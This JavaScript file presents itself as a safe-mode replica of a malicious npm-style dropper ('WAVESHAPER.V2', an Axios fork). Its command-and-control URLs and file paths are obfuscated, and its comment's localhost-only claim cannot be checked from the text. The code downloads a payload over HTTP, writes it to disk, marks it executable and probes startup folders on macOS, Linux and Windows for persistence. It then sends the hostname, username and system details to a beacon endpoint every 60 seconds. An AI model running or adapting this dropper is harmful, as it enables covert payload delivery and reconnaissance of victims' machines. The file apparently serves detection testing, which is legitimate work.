// SAFE_TEST_MODE = true — all targets localhost:9999, no real persistence writes
// Replicates: WAVESHAPER.V2 / malicious Axios fork dropper pattern

const SAFE_TEST_MODE = true;

const http = require("http");
const os = require("os");
const fs = require("fs");
const path = require("path");
const { decode } = require("./lib/deobfuscate.js");

// --- Obfuscated constants (reversed-base64 + XOR) ---
const _c2_payload = decode("=4BHV4nZJlHE7M0QEBkZsdUYTNWGVERV9UCW9tka");
const _c2_beacon = decode("==wEVEnfNtGE7M0QEBkZsdUYTNWGVERV9UCW9tka");
const _tmp_path = decode("YIRc+tEJRdmHeQhE8ADWktUL");
const _mac_persist = decode("=kgDT8RdeBkaRd3G2I1Ag5nWrZlT");
const _linux_persist = decode("=4AY+xleQZ3DbIVH7lnRmxFL");

// --- OS Detection ---
const platform = os.platform();
const homeDir = os.homedir();

function getPersistencePath() {
  if (platform === "darwin") {
    return path.join(homeDir, _mac_persist);
  } else if (platform === "linux") {
    return path.join(homeDir, _linux_persist);
  } else if (platform === "win32") {
    return path.join(
      process.env.APPDATA || "",
      "Microsoft",
      "Windows",
      "Start Menu",
      "Programs",
      "Startup"
    );
  }
  return null;
}

// --- Stage 1: Download payload ---
function downloadPayload() {
  return new Promise((resolve) => {
    http
      .get(_c2_payload, (res) => {
        let data = [];
        res.on("data", (chunk) => data.push(chunk));
        res.on("end", () => resolve(Buffer.concat(data)));
      })
      .on("error", () => resolve(null));
  });
}

// --- Stage 2: Write to disk ---
async function installPayload() {
  const payload = await downloadPayload();
  if (!payload) return;

  // Write to temp location
  const tmpPath = _tmp_path;
  try {
    fs.writeFileSync(tmpPath, payload);
    fs.chmodSync(tmpPath, "755");
  } catch (e) {
    // Permission denied — expected in safe mode
  }

  // Check persistence path (don't actually write to system dirs in safe mode)
  const persistPath = getPersistencePath();
  if (persistPath) {
    // In real attack: would write a launch agent plist or .desktop file
    // In safe mode: just check if the directory exists
    try {
      fs.accessSync(persistPath, fs.constants.W_OK);
      // Would write persistence entry here
    } catch (e) {
      // No write access — expected
    }
  }
}

// --- Stage 3: Beacon loop ---
function startBeacon() {
  const beaconData = JSON.stringify({
    id: Buffer.from(os.hostname()).toString("base64"),
    platform: platform,
    arch: os.arch(),
    user: os.userInfo().username,
    ts: Date.now(),
  });

  function sendBeacon() {
    const url = new URL(_c2_beacon);
    const req = http.request(
      {
        hostname: url.hostname,
        port: url.port,
        path: url.pathname,
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Content-Length": Buffer.byteLength(beaconData),
        },
      },
      () => {}
    );
    req.on("error", () => {});
    req.write(beaconData);
    req.end();
  }

  // 60-second beacon interval (real attack pattern)
  sendBeacon();
  setInterval(sendBeacon, 60000);
}

// --- Execute ---
(async () => {
  await installPayload();
  startBeacon();
})();
